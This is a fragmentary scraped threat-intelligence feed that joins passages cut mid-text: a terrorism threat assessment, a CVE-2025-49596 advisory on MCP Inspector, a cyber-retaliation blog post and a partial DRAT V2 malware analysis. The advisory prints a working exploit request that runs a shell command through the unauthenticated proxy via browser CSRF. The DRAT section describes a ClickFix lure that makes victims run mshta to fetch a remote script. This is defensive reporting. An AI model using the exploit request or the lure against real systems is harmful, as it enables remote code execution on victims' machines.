href="https://gnet-research.org/2024/06/27/iskps-latest-campaign-expanded-propaganda-and-external-operations/">encourage</a> supporters around the world to conduct attacks targeting sports stadiums, large concert halls, and major public events in the US and Europe.</p>

          </div>
        </div>
        <p>While US-based IS supporters have represented a persistent threat despite ebbs and flows in the organization’s health overseas, ongoing geopolitical developments that are very likely <a href="https://foreignpolicy.com/2025/06/05/syrias-islamic-state-is-surging/">favorable</a> to IS will likely enhance its ability to inspire and direct plots in the US. The fall of the Assad regime in Syria, ongoing Turkish military operations in the north of the country, and a decrease in foreign assistance (through funds and military support) to the Kurdish-led Syrian Democratic Forces (SDF) will very likely create <a href="https://www.understandingwar.org/backgrounder/us-withdrawal-syria-will-reinvigorate-isis-terror-threat">opportunities</a> for IS in Iraq and al-Sham (ISIS) to exploit security vacuums and threaten areas in east and northeast Syria. The threat of an ISIS resurgence in 2025 would almost certainly be <a href="https://www.washingtoninstitute.org/policy-analysis/islamic-state-attacks-new-syrian-government">exacerbated</a> by major terrorist attacks against the new Syrian government, or alternatively by a “prison break” operation to <a href="https://www.politico.com/news/2024/12/17/us-syria-isis-jails-00194955">free</a> captive ISIS fighters and supporters in the SDF-managed al-Hawl and al-Roj prison camps. In the immediate term, an ISIS resurgence would almost certainly provide a propaganda boost for the group’s international supporters. In the medium term, it could create opportunities for ISIS to relaunch its external operations capabilities and target the US.</p>
        <h3>Al-Qaeda</h3>
        <p>Al-Qaeda very likely has a limited degree of support among American jihadist Salafi HVEs and is very unlikely to gain much more support due to the ongoing influence of its competitor, IS. In 2024, the US Intelligence Community assessed that al-Qaeda’s central command had <a href="https://www.dni.gov/files/ODNI/documents/assessments/ATA-2024-Unclassified-Report.pdf">reached</a> its “operational nadir.” While some of the group’s franchises enjoyed substantial success during the past twelve months, the strongest al-Qaeda franchises will likely remain <a href="https://www.csis.org/analysis/jihadist-terrorism-united-states#:~:text=Aside%20from%20the%209%2F11,in%20which%20a%20Royal%20Saudi">focused</a> on their areas of operation and are unlikely to devote significant resources to attacking the West in the short term. Nevertheless, the activities of specific al-Qaeda affiliates in 2024 and early 2025 portend an expanded threat to the US:</p>
        <ul>
          <li>In early 2025, Al-Shabaab <a href="https://www.france24.com/en/live-news/20250327-fears-mount-over-resurgence-of-al-shabaab-jihadists-in-somalia">launched</a> a military operation in the Shabelle and Hiiraan regions of Somalia to recapture areas it held prior to a 2022 counterterrorism operation by the Somali Armed Forces. This ongoing operation will very likely <a href="https://warontherocks.com/2025/06/flailing-state-the-resurgence-of-al-shabaab-in-somalia/">position</a> al-Shabaab to threaten the capital city, Mogadishu, as well as the Somalian government’s control over large swaths of the country. A revanchist al-Shabaab with significant territorial control in Somalia would almost certainly <a href="https://www.foreign.senate.gov/imo/media/doc/031418_Bacon_Testimony.pdf">threaten</a> US interests in the Horn of Africa and the Middle East; the group also likely has the means and intent to <a href="https://www.atlanticcouncil.org/blogs/new-atlanticist/the-us-must-sustain-counterterrorism-operations-in-somalia-the-costs-of-retreat-are-too-high/">threaten</a> the US homeland by externally guiding attack plots.</li>
          <li>In late 2023, Al-Qaeda in the Arabian Peninsula (AQAP) <a href="https://www.njohsp.gov/Home/Components/News/News/1388/2">restarted</a> its English-language Inspire series, which provides directions and information for English speakers on conducting terrorist attacks in the West. A February 2024 video specifically <a href="https://monitoring.bbc.co.uk/product/c204zmoi">called</a> for HVEs in the US to conduct local attacks because of the US’s support for Israel in its conflict against Hamas. In June 2025, a video message from AQAP leader Sa’ad bin Atef al-Awlaki <a href="https://www.timesofisrael.com/al-qaedas-yemen-chief-threatens-trump-musk-over-gaza-war-there-are-no-red-lines/">encouraged</a> HVEs to assassinate US political leaders, including President Trump and Vice President JD Vance.</li>
          <li>On May 29, 2025, US Africa Command (AFRICOM) Commander General Michael Langley <a href="https://abcnews.go.com/Politics/africa-terror-group-ramping-ability-strike-inside-us/story?id=122316983">warned</a> that Jama’at Nusrat al-Islam w’al-Muslimin (JNIM), an al-Qaeda franchise in the Sahel that has gained a substantial territorial footprint in the region, “could have the capacity to attack the homeland.” However, Insikt Group has not identified intelligence suggesting JNIM has displayed an interest in extraterritorial attack capabilities.</li>
        </ul>
        <p>US-based IS and al-Qaeda supporters will almost certainly continue to use low-budget, low-sophistication, but lethal, <a href="https://www.foreignaffairs.com/articles/united-states/2017-06-13/dont-follow-money">methods</a> of attack such as firearms, bladed weapons, and vehicular assaults, as well as retain their focus on targeting US government and law enforcement agencies, major public events, large commercial facilities, and targets associated with Jewish or Christian communities in the US. However, due to their increasing affordability, commercial availability, and ease of use, jihadist Salafi attack planners are also very likely to experiment with UAV and UAV-borne IEDs as attack TTPs. During 2024, jihadist Salafi propaganda frequently promoted the use of drones in conducting attacks, with some unofficial outlets providing guidance to supporters on how to operate them. A successful UAV-borne IED attack plot, whether in the US or overseas, would almost certainly <a href="https://ctc.westpoint.edu/the-rising-threat-of-non-state-actor-commercial-drone-use-emerging-capabilities-and-threats/">demonstrate</a> a proof of concept and supercharge jihadist Salafi HVEs’ interest in UAVs.</p>
        <h3>Hamas</h3>
        <p>Mass-casualty terrorist attacks in the US with a nexus to Hamas or other Palestinian Territories-based FTOs (including Palestinian Islamic Jihad [PIJ], the Popular Front for the Liberation of Palestine [PFLP], and others) remain very unlikely in the short term. These organizations have not demonstrated a capability or interest in conducting large-scale attacks in the US, although their ongoing conflict against Israel has almost certainly <a href="https://www.justice.gov/opa/media/1402301/dl">inspired</a> US violent extremists without tangible ties to the organizations to conduct violence. Since Hamas’s October 7, 2023, al-Aqsa Flood terrorist attack in Israel, the Israel Defense Forces (IDF) have almost certainly <a href="https://www.bbc.com/news/world-middle-east-67103298">decimated</a> Hamas’s leadership, particularly within the Izz ad-Din al-Qassam Brigades, the organization’s military wing. Because of the element of inspiration, large-scale attack plots perpetrated by Hamas supporters in the US cannot be ruled out, although most violence with a direct link to the group is very likely to be small-scale and sporadic, and only occur at protests or demonstrations where Hamas supporters confront counter-demonstrators or law enforcement.</p>
        <p>While post-October 7 developments and Hamas’s conflict with Israel continue to almost certainly <a href="https://www.dhs.gov/sites/default/files/2024-10/24_0930_ia_24-320-ia-publication-2025-hta-final-30sep24-508.pdf">motivate</a> sympathies for Hamas among American violent extremists, the primary means of interaction between US Hamas supporters and the organization’s command and control structure almost certainly continues to be through financing efforts. The group has almost certainly <a href="https://www.congress.gov/crs-product/IF12537">created</a> a complex network of cryptocurrency donation portals, exchanges, and wallets, from which they have <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">generated</a> “tens of millions” of US dollars from foreign donors, including from the US. These networks have likely replaced the role of “brick-and-mortar” US-based charitable organizations that, for decades, have allegedly <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2023-10/hamas-networks-final.pdf">provided</a> funds from US donors to Hamas, PIJ, PFLP, and other Palestinian FTOs.</p>
        <h3>Axis of Resistance</h3>
        <p>The US missile strikes targeting Iranian nuclear facilities on June 21 and 22, 2025, likely increased the risk of HVE and DVE supporters of Iran and its Axis of Resistance groups, such as Hezbollah, the Houthis, Iraqi Shi’a militias, and others, conducting physical threat activities on US soil, although these groups are still unlikely to carry out a mass-casualty terrorist attack in the US during the next twelve months. While Iran’s military and intelligence agencies are likely to enhance their efforts to <a href="https://www.washingtoninstitute.org/policy-analysis/contending-irgc-plots">recruit</a> assets in the US to carry out targeted attacks against US political figures and dissidents in the aftermath of the strikes, these efforts will very likely be constrained by US law enforcement investigations, the relative structural weakness of Axis of Resistance groups, and the almost certain disinterest of many US-based HVE and DVE groups in supporting Iran. Several factors during the next twelve months, including public incitement of attacks on US soil by Iranian officials or future US military activity against Iran, could <a href="https://www.dhs.gov/ntas/advisory/national-terrorism-advisory-system-bulletin-june-22-2025">augment</a> these threats, although the most likely scenario is US HVEs and DVEs attempting to provide financial and material support to these groups on their own.</p>
        <p>Iran’s proxies have not publicly indicated their interest in recruiting or directing Americans to conduct attacks on their behalf in the US since October 7, 2023. However, Iran’s military and intelligence agencies, particularly the Islamic Revolutionary Guard Corps (IRGC), have almost certainly continued their efforts to <a href="https://www.justice.gov/archives/opa/pr/member-irans-islamic-revolutionary-guard-corps-irgc-charged-plot-murder-former-national">recruit</a> and <a href="https://www.yahoo.com/news/iranian-regime-media-praises-alleged-165750170.html?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAL1ieWEJq2Ibjsklz0LAFd39o3v0kCr5yAvdW5o1TN9OyMaozdUtdoP7A_QUd1o_CXEo6iX1HayOCb12jq0679ZhQzyP-1lpiQ22yWrPl-XB-fdPpkRVks46EIhAfPn9JXp6ya7c4rHr-zW2m9sq_0EgsZXmdxzbN_9i56MAFI-o">incite</a> overseas threat actors to <a href="https://www.justice.gov/usao-sdny/pr/us-attorney-announces-murder-hire-and-related-charges-against-irgc-asset-and-two-local">conduct</a> targeted attacks and assassinations against high-profile US politicians and Iranian dissidents on US soil. Iran’s motivation to revitalize these efforts, several of which have been <a href="https://edition.cnn.com/2022/08/10/politics/justice-department-charges-iranian-with-trying-to-assassinate-john-bolton">identified</a> and <a href="https://www.pbs.org/newshour/world/pakistani-man-with-ties-to-iran-is-charged-in-u-s-political-assassination-plot">disrupted</a> by US law enforcement, likely increased in the immediate aftermath of US directly attacking Iran, although the subsequent ceasefire and cessation of US military activity in Iran will very likely decrease Iran’s appetite for remotely guiding terror plots in the medium-to-long term, if the ceasefire holds. There is no evidence to suggest that the IRGC exclusively recruits ideologically motivated violent extremists for these efforts (many of their <a href="https://www.bbc.com/news/articles/c308p0rjq9zo">assets</a> have been <a href="https://www.justice.gov/archives/opa/pr/justice-department-announces-murder-hire-and-related-charges-against-irgc-asset-and-two">participants</a> in criminal organizations who are financially solicited to conduct attacks), and Iran will very likely attempt to <a href="https://www.cbsnews.com/amp/news/trump-administration-monitor-iran-backed-cells-trump-weighs-strikes/">exploit</a> threat actors in the US with common ideological causes to conduct attacks on their behalf.</p>
        <p>Hezbollah’s ability to conduct extraterritorial attacks outside of Lebanon was almost certainly diminished by the leadership losses the organization <a href="https://www.washingtoninstitute.org/policy-analysis/after-hezbollahs-miscalculations-it-has-lost-much-its-power">suffered</a> during Israeli strikes in 2024, particularly its secretaries general Hassan Nasrallah and Hashem Safieddine and military leaders Fuad Shukr and Ibrahim Aqil. Notably, Aqil was a senior <a href="https://www.washingtoninstitute.org/policy-analysis/death-another-hezbollah-lifer">member</a> of Hezbollah’s Islamic Jihad Organization, which has historically been <a href="https://www.odni.gov/nctc/terrorist_groups/lebanese_hizballah.html">responsible</a> for planning external operations, including in the US. Ongoing Lebanese government efforts to demilitarize Hezbollah will likely further reduce the group’s capabilities and interest in attacking the West. In 2024, there were sporadic instances of US HVEs attempting to <a href="https://www.justice.gov/usao-wdpa/pr/upper-st-clair-man-who-traveled-lebanon-and-syria-goal-joining-hizballah-indicted">provide</a> material support for Hezbollah by joining the organization, although in these cases Hezbollah almost certainly indicated they were uninterested in taking on US or Western foreign fighters.</p>
        <p>Likewise, the Houthis have not demonstrated the intent, capability, or interest in conducting terrorist attacks in the US, preferring to <a href="https://www.crisisgroup.org/visual-explainers/red-sea/">target</a> commercial vessels in the Red Sea and, on occasion, Israel. On March 5, 2025, the US Department of State <a href="https://www.state.gov/designation-of-ansarallah-as-a-foreign-terrorist-organization/">redesignated</a> the Houthis as an FTO just before the <a href="https://news.usni.org/2025/04/29/operation-rough-rider">launch</a> of Operation Rough Rider, a US military campaign of airstrikes against the organization in Yemen. During the next twelve months, there are likely to be instances where US HVEs donate or otherwise provide material support to the Houthis. In this case, it would be unclear whether this trend would represent an increase in this activity, as the provision of material support to the Houthis was not illegal (and therefore not subject to prosecutions and investigations) in the US prior to their March 5, 2025, designation.</p>

            <content:encoded><![CDATA[
        <h2>What is CVE-2025-49596?</h2>
        <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596">CVE-2025-49596</a> is a critical remote code execution vulnerability discovered in Anthropic's MCP Inspector tool. MCP is an open standard allowing AI applications to exchange structured context and actions with external tools, and MCP servers are the lightweight programs that expose those tools and data through the protocol. <a href="https://github.com/modelcontextprotocol/inspector">MCP Inspector</a> is a developer-oriented debugging tool for interactively testing and validating MCP server implementations. Successfully exploiting CVE-2025-49596 allows unauthenticated attackers to conduct remote code execution (RCE).</p>
        <p>MCP Inspector consists of:</p>
        <ul>
          <li>MCP Inspector Client (MCPI): A web-based UI designed to test and debug MCP servers interactively.</li>
          <li>MCP Proxy (MCPP): A server that functions as a protocol bridge, linking the client UI to MCP servers using stdio, Server-Sent Events, or HTTP.</li>
        </ul>
        <p>The flaw arises because the MCPP accepts arbitrary <code>stdio</code> commands without authenticating or validating the source of requests from its browser client. If the proxy is reachable on the local network or exposed to the internet, an attacker can issue arbitrary MCP commands.</p>
        <h2>Insikt Group’s Assessment of CVE-2025-49596</h2>
        <p>In practice, an attacker can exploit this weakness by abusing a known browser behavior in which some browsers interpret 0.0.0.0 as equivalent to localhost. When combined with a Cross-Site Request Forgery (CSRF) vulnerability, this allows attackers to send malicious HTTP requests from public web pages to the MCPP. For example, an attacker could craft a request such as:</p>
        <ul>
          <li><code>hxxp://0.0.0.0:6277/sse?transportType=stdio&amp;command=touch&amp;args=%2Ftmp%2Fexploited-from-the-browser</code></li>
        </ul>
        <p>The request runs <code>touch /tmp/exploited-from-the-browser</code> on the victim’s host, giving the attacker the same privileges as the user who started MCP Inspector and visibility into any network-attached resources. A typical exploitation chain involves a malicious web page whose JavaScript dispatches the above request to 0.0.0.0:6277, instructing the proxy to execute arbitrary commands.</p>
        <p>Cybersecurity firm <a href="https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596">Oligo</a> also demonstrated that the same RCE can be achieved through DNS rebinding. An attacker hosts a webpage whose domain resolves first to a public IP and then (after the browser grants trust) to 127.0.0.1/0.0.0.0. Because the origin is still the attacker’s webpage, the browser allows the script to send requests to the local MCP Inspector instance listening on localhost, bypassing same-origin rules and reaching the unauthenticated API.</p>
        <p>Insikt Group created a Nuclei template to detect CVE-2025-49596, which can be found attached to this blog post. The template sends a GET request to the <code>/sse</code> endpoint and provides the parameters <code>transportType=stdio</code>, <code>command=echo</code>, and <code>args=CVE-2025-49596_TEST</code>. It then checks for a 200 OK response containing <code>sessionId=</code> in the body. In patched versions, the server responds with a 401 Unauthorized status and contains "Authentication required. Use the session token shown in the console when starting the server" in the response body.</p>
        <p>At the time of writing, there were 560 exposed MCP Inspector instances on Shodan, most of which are geolocated in the US and China. However, not all of these are necessarily vulnerable, as their specific versions are unknown.</p>

        <h2>Recommended Actions for CVE-2025-49596</h2>
        <p>Users should upgrade to MCP Inspector version 0.14.1 or later, as implemented by Anthropic in commit <a href="https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979">50df0e1</a>. This update introduced safeguards to block CSRF from arbitrary public origins:</p>
        <ul>
          <li>Session tokens are now generated automatically and must accompany every proxy request.</li>
          <li>Allowed-origin checks reject traffic from unauthorised websites when the server is bound only to localhost.</li>

            <description><![CDATA[Dive into the concept of the "retaliation window"—how timing influences threat intelligence, risk management, and strategic decision-making in today's cyber and business landscape.]]></description>
            <content:encoded><![CDATA[
        <p><em>ChatGPT: National Cyber Retaliation Possibilities</em></p>
        <p>What happens when a strike silences centrifuges but accelerates keyboards? History tells us this story. When kinetic operations eliminate nuclear capabilities, adversaries pivot to asymmetric digital warfare. US and Israeli companies now sit squarely in the cyber crosshairs.</p>
        <h2>Escalation with Code Instead of Missiles</h2>
        <p>The US kinetic strike on Iran's Fordow enrichment plant creates questions about retaliation doctrine. Historical precedent reveals Iran's preference for <a href="https://ctc.westpoint.edu/cyber-threat-iran-death-soleimani/">cyber responses</a> to physical provocations. 2012’s <a href="https://www.ebsco.com/research-starters/political-science/operation-ababil-2012">Operation Ababil</a> and <a href="https://www.controleng.com/throwback-attack-hackers-take-advantage-of-the-holidays-to-hit-oil-giant-saudi-aramco/">Shamoon wiper attack</a>, and 2014’s <a href="https://www.bloomberg.com/news/articles/2014-12-11/iranian-hackers-hit-sheldon-adelsons-sands-casino-in-las-vegas?sref=D1QuWRIe">attack on Sands</a>, demonstrated this pattern. Russia's possible concurrent involvement in such campaigns amplifies both reach and destruction potential.</p>
        <p>Intelligence professionals recognize that adversary keyboards often respond faster than missile batteries. For executives, the core question isn't "Will there be cyber retaliation?" but rather "Where, when, and how severe?"</p>
        <h2>Understanding Adversary Archetypes</h2>
        <p>Recorded Future's threat intelligence reveals distinct operational signatures across Iranian and Russian threat actors:</p>
        <ul>
          <li><strong>Iranian APT groups (APT34, APT39, APT35)</strong> demonstrate sophisticated credential harvesting campaigns targeting government contractors and energy infrastructure. Their methodology emphasizes long dwell-time persistence and intelligence collection over immediate destruction.</li>

        </ul>

          </div>
        </div>
        <ul>
          <li><strong>Russian-aligned actors (APT44, KillNet, BlueDelta)</strong> favor destructive operations, including wipers, DDoS campaigns, and infrastructure targeting. These groups excel at civil disruption and psychological operations.</li>
          <li><strong>Fusion campaigns</strong> represent the emerging threat model where diversionary attacks mask primary objectives. DDoS serves as operational noise while parallel intrusions establish persistent access for data exfiltration or lateral movement.</li>
        </ul>
        <p><a href="https://www.bloomberg.com/news/articles/2025-06-20/iran-hijacking-home-security-cameras-to-spy-within-israel?sref=D1QuWRIe">Recent events</a> indicate Iranian TTPs mimicking previous Russian cyber unit successes in Ukraine, though <a href="https://t.me/estoniaworldwide/280143">Telegram claims</a> of active collaboration and targeting shared adversaries are currently unsubstantiated.</p>
        <h2>Sector Prioritization Analysis</h2>
        <p>Based on volume and velocity analytics from Recorded Future's platform, the following sectors present the highest-probability targets for retaliatory operations:</p>
        <p><strong>Energy and Utilities</strong> remain symbolically and strategically valuable. Iranian threat actors demonstrated a sophisticated understanding of industrial control systems in previous Aramco operations. Expect renewed focus on grid infrastructure and petroleum refinement.</p>
        <p><strong>Defense and Aerospace</strong> contractors face elevated spearphishing and supply chain compromise attempts. Organizations with known DoD contracts should anticipate credential stuffing, social engineering, and APT pivot campaigns targeting intellectual property.</p>
        <p><strong>Financial Services</strong> attract Russian DDoS expertise and payment ecosystem disruption. Major banks, cryptocurrency platforms, and payment processors face coordinated attacks designed to undermine confidence in financial stability.</p>
        <p><strong>Healthcare and Water Infrastructure</strong> provide "soft power" leverage without triggering a full military response. <a href="https://therecord.media/us-offers-reward-for-info-on-iranian-hackers-water-utilities">Recent intrusions into US water treatment facilities</a> illustrate this tactical approach.</p>
        <p>The <a href="https://intelligence2risk.substack.com/p/charting-new-terrain-the-shift-to">proximity-and-resilience graph</a> suggests these sectors will experience accelerated attack velocity as geopolitical tensions escalate.</p>
        <h2>Strategic Readiness Beyond SOC Operations</h2>
        <p>Operational controls represent a baseline defense. Resilient organizations distinguish themselves through executive-level preparation and strategic threat anticipation.</p>
        <h3>Intelligence-Driven Risk Communication</h3>
        <p>Implement the <a href="https://intelligence2risk.substack.com/p/intelligence-to-risk">Intelligence to Risk (I2R) Pyramid framework</a> to translate event signals into board-level recommendations. Intelligence without downstream decision impact merely creates noise. Effective CTI programs identify threat implications, validate control effectiveness, and produce actionable recommendations with clear upside/downside risk articulation.</p>
        <h3>Scenario Development Using Structured Frameworks</h3>
        <p>Deploy PESTLE (Political, Economic, Sociological, Technological, Legal, Environmental) analysis and <a href="https://intelligence2risk.substack.com/p/the-resilience-dilemma">Cone of Plausibility modeling</a> to evaluate second- and third-order impacts. Assume hybrid threat scenarios where cyber attacks coordinate with disinformation campaigns, fraud operations, or supply-chain corruption.</p>
        <h3>Resilience Measurement and Validation</h3>
        <p>Move beyond compliance theater toward continuous control validation. Organizations with genuine <a href="https://intelligence2risk.substack.com/p/rate-my-rizz">resilience ("rizz")</a> regularly test defenses using real-world TTPs rather than audit checklists. Control validation platforms enable automated purple teaming and breach simulation using current adversary methodologies.</p>
        <h3>Crisis Scenario Exercises</h3>
        <p>Conduct tabletop exercises simulating destructive ransomware, DNS hijacking, or public data exposure campaigns tied to adversarial propaganda. Include communications, legal, finance, and supply chain leadership in scenario planning.</p>
        <h3>External Dependency Risk Assessment</h3>
        <p>Inventory and validate upstream service providers, including CDN, DNS, and hosting infrastructure. If Iranian botnets target DNS registrars or Russian DDoS campaigns affect ISP connectivity, backup options become critical.</p>
        <h3>AI-Enabled Defense to Mirror Adversary Velocity</h3>
        <p>Modern threat actors leverage AI for campaign acceleration and evasion techniques. Defensive AI adoption becomes essential for matching adversary tempo and scale.</p>
        <ul>
          <li>Automate initial incident triage using AI classification systems. When Iranian APT groups launch credential harvesting campaigns targeting hundreds of employees simultaneously, AI-driven email analysis can identify and quarantine malicious messages faster than manual review processes.</li>
          <li>Implement AI-enhanced deception technologies that adapt honeypot configurations based on observed attacker TTPs. Dynamic deception networks can automatically adjust to mirror production environments while capturing threat actor tooling and methodologies.</li>
          <li>Use generative AI for threat intelligence synthesis and executive reporting. Large language models can process multiple threat feeds, correlate indicators across campaigns, and generate actionable summaries for board-level consumption within minutes rather than hours.</li>
          <li>Consider AI-assisted red team exercises that continuously probe defenses using current adversary techniques. Automated purple teaming platforms can simulate Iranian spearphishing or Russian wiper campaigns at scale, identifying control gaps before real attacks exploit them.</li>
        </ul>
        <p>Even with the best of AI, human expertise remains critical for strategic decision-making, false positive management, and complex threat attribution. The optimal approach combines AI speed with human judgment.</p>
        <h2>From Crisis Optics to Resilient Strategy</h2>
        <p>Kinetic escalation has opened pathways for asymmetric digital retribution. However, resilient enterprises leverage threat intelligence for decision-making before breaches occur. This requires abandoning audit theater, embracing proactive control validation, and communicating risk in executive-comprehensible language.</p>
        <p>The current geopolitical environment demands evolved approaches to cyber resilience. Organizations that recognize this shift and adapt accordingly will maintain operational continuity while competitors struggle with reactive crisis management.</p>
        <p>In this new phase of geopolitical conflict, it's not just data that is at stake—it's institutional confidence and competitive advantage.</p>

            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>During an investigation into a <a href="https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence">recent</a> TAG-140 campaign targeting Indian government organizations, Insikt Group identified a modified variant of the DRAT remote access trojan (RAT), which we designated as DRAT V2. TAG-140 has overlaps with SideCopy, an operational subgroup assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC LEOPARD). TAG-140 has consistently demonstrated iterative advancement and variety in its malware arsenal and delivery techniques. This latest campaign, which spoofed the Indian Ministry of Defence via a cloned press release portal, marks a slight but notable shift in both malware architecture and command-and-control (C2) functionality.</p>
        <p>The deployment of DRAT V2 reflects TAG-140’s ongoing refinement of its remote access tooling, transitioning from a .NET-based version of DRAT to a new Delphi-compiled variant. Both versions are among numerous RATs the group has leveraged, such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, and ReverseRAT, indicating a pattern of rotating malware use. DRAT V2 updates its custom TCP-based, server-initiated C2 protocol and expands functional capabilities, including arbitrary shell command execution and enhanced file system interaction.</p>
        <p>Analysis of the infection chain indicates that initial access was achieved through a ClickFix-style social engineering lure. Victims were enticed to execute a malicious script via mshta.exe, which led to the execution of the BroaderAspect .NET loader, which has <a href="https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india">previously</a> been used by TAG-140. BroaderAspect establishes persistence and subsequent DRAT V2 installation and execution.</p>
        <p>Insikt Group attributes this activity to TAG-140 with moderate confidence based on domain overlap, malware lineage, and infrastructure characteristics. DRAT V2’s enhancements suggest a likely increase in TAG-140’s capacity for tailored post-exploitation and lateral movement across victim networks. As such, its emergence is a relevant indicator of the threat actor’s maturing tradecraft and strategic targeting of India’s defense and governmental institutions.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>DRAT V2 adds a new command (exec_this_comm) for arbitrary shell command execution, enhancing post-exploitation flexibility.</li>
          <li>The malware obfuscates its C2 IP addresses using Base64 encoding with prepended strings to hinder straightforward decoding.</li>
          <li>Compared to its predecessor, DRAT V2 reduces string obfuscation by keeping most command headers in plaintext, likely prioritizing parsing reliability over stealth.</li>
          <li>DRAT V2 updates its custom server-initiated TCP protocol to support commands input in both ASCII and Unicode, while responding in ASCII only.</li>
          <li>DRAT V2 lacks advanced anti-analysis techniques and relies on basic infection and persistence methods, making it detectable via static and behavioral analysis.</li>
        </ul>
        <h2>Background</h2>
        <p>TAG-140 is a threat actor group that overlaps with the publicly reported group Sidecopy, a <a href="https://thehackernews.com/2021/07/sidecopy-hackers-target-indian.html">suspected</a> Pakistani state-aligned advanced persistent threat (APT) group assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC Leopard). Active since at least 2019, TAG-140 primarily <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks">targets</a> Indian entities, with recent activity expanding beyond traditional government, defense, maritime, and academic sectors to now include organizations affiliated with the country’s railway, oil and gas, and external affairs ministries.</p>
        <p>The group has demonstrated (<a href="https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india">1</a>, <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks">2</a>, <a href="https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat">3</a>) a consistent evolution in its tradecraft: leveraging spearphishing campaigns, using HTML applications (HTAs) or Microsoft Installer (MSI) packages for distribution, exploiting software vulnerabilities (for example, WinRAR), and using many different RATs such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, ReverseRAT, and DRAT. Their infection chains commonly target both Windows and Linux environments.</p>
        <p>Insikt Group analyzed <a href="https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence">artifacts</a> from a recent ClickFix campaign spoofing the Indian Ministry, which we have attributed to TAG-140 threat actors. TAG-140 created a counterfeit website mimicking the Indian Ministry of Defence's official press release portal using the malicious domain <em>email[.]gov[.]in[.]drdosurvey[.]info</em>, which closely resembles the legitimate government website <em>mod[.]gov[.]in</em> (<a href="https://urlscan.io/result/72a275de-19dd-4f96-9594-43a676b86ff5/">urlscan.io</a>). The cloned website replicated the structure and layout of the authentic portal, listing press releases from September 2023 to April 2025. However, only the link for March 2025 was active.</p>

        </div>
        <p>Clicking the active March 2025 link triggered a ClickFix-style social engineering attack. Insikt Group conducted additional analysis of the TAG-140 Windows infection chain and determined it to be similar to an infection chain <a href="https://www.seqrite.com/blog/goodbye-hta-hello-msi-new-ttps-and-clusters-of-an-apt-driven-by-multi-platform-attacks/">reported</a> by Seqrite Labs in their research on TAG-140 activity, which was identified in late 2024. Our analysis of the infection chain (<strong>Figure 2</strong>) reveals that the final payload is a new Delphi-based variant of DRAT (referred to as DRAT V2). Previously, DRAT was developed in .NET and was first <a href="https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/">attributed</a> to SideCopy activity in 2023. The updated variant includes new command functionality and a slightly modified C2 protocol.</p>

While we do not know the delivery mechanism used, based on TAG-140’s tactics, techniques, and procedures (TTPs), this is likely delivered as a spearphishing email enticing the user to click on the link. The user is then lured to click on the “March 2025 Release” link. From a Windows machine, clicking on that link redirects the user to the uniform resource identifier (URI) /captcha/windows.php.</p>

        <p>3. Clicking “continue” runs JavaScript that copies the malicious command below to the clipboard and directs the user to paste and execute it in a command shell. The command uses mshta.exe to fetch and run a remote script (index.php/sysinte.hta) from TAG-140’s infrastructure, _trade4wealth[.]in_.</p>

        <p>Insikt Group attributes this activity to TAG-140 with moderate confidence based on the following aspects:</p>

        <h2>Technical Analysis</h2>
        <p>DRAT V2 is a lightweight RAT developed in Delphi and represents an evolution of the earlier .NET-based variant first attributed to TAG-140 in 2023. DRAT V2 introduces several updates from its predecessor, including:</p>
        <ul>
          <li>An update to its custom TCP server-initiated C2 protocol</li>
          <li>Enhanced Base64 obfuscation of C2 infrastructure with added prepended strings</li>
          <li>Updated command headers and a new command for the execution of arbitrary Windows commands</li>
        </ul>
        <p>A high-level overview of DRAT V2 is provided in <strong>Figure 3</strong>.</p>

          </div>
        </div>
        <p>DRAT V2 supports a set of commands that allow TAG-140 operators to perform a wide range of interactions with compromised hosts. Upon establishing communication, the malware passively awaits instructions from the C2 server. Supported operations include system reconnaissance, such as collecting the username, operating system version, system time, and current working directory, as well as connectivity validation and enumeration of local file systems and directories.</p>
        <p>Beyond reconnaissance, DRAT V2 facilitates more active engagement with the target environment. It enables file transfers in both directions between the host and the C2 infrastructure, allowing operators to upload additional payloads or exfiltrate data. Additionally, it supports the execution of local files and arbitrary Windows shell commands, returning the output to the C2. These functions provide TAG-140 with persistent, flexible control over the infected system and allow for both automated and interactive post-exploitation activity without requiring the deployment of auxiliary malware tools. <strong>Figure 4</strong> provides a summary of DRAT V2’s capabilities.</p>

        <h2>DRAT V2 Commands</h2>
        <p>DRAT V2 continues its use of a command interface that is a custom TCP, text-based, server-initiated protocol to support remote control capabilities across a compromised host. Command execution, file manipulation, and system reconnaissance are enabled through a structured format.</p>
